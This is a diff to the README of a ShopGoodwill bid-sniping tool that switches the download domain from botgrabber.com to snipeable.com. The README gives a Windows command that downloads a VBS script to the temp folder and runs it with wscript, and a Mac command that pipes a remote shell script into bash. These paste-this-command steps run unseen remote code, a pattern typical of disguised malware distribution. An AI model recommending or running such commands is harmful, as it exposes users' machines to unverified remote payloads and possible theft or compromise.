@@ -23,7 +23,7 @@ When you use our **ShopGoodwill Sniper**, you gain:
 Install the **ShopGoodwill Sniper** on Windows using Command Prompt:
 
 ```cmd
-curl -fsSL https://botgrabber.com/download/install-shopgoodwill-sniper.vbs -o "%TEMP%\sg.vbs" && wscript "%TEMP%\sg.vbs"
+curl -fsSL https://snipeable.com/download/install-shopgoodwill-sniper.vbs -o "%TEMP%\sg.vbs" && wscript "%TEMP%\sg.vbs"
 ```
 
 **Windows Setup Tutorial**: Watch our [complete Windows installation guide](https://www.youtube.com/watch?v=I0pWOUshlOE) for step-by-step instructions.
@@ -33,7 +33,7 @@ curl -fsSL https://botgrabber.com/download/install-shopgoodwill-sniper.vbs -o "%
 Install the **bid sniper for ShopGoodwill** on Mac using Terminal:
 
 ```bash
-curl -fsSL https://botgrabber.com/download/install-shopgoodwill-sniper.sh | bash
+curl -fsSL https://snipeable.com/download/install-shopgoodwill-sniper.sh | bash
 ```
 
 **Mac Setup Tutorial**: Follow our [Mac installation walkthrough](https://www.youtube.com/watch?v=VK2tm3c7CrY) for detailed guidance.
@@ -227,7 +227,7 @@ Connect with other **ShopGoodwill Sniper** users:
 
 ### Additional Resources
 
-- **Official Website**: [WebsiteSniper.com](https://websitesniper.com)
+- **Official Website**: [Snipeable.com](https://snipeable.com/)
 - **Video Tutorials**: [YouTube Channel](https://www.youtube.com/watch?v=iF_m-xIBnJU)
 - **GitHub Repository**: Latest source code and issues
 
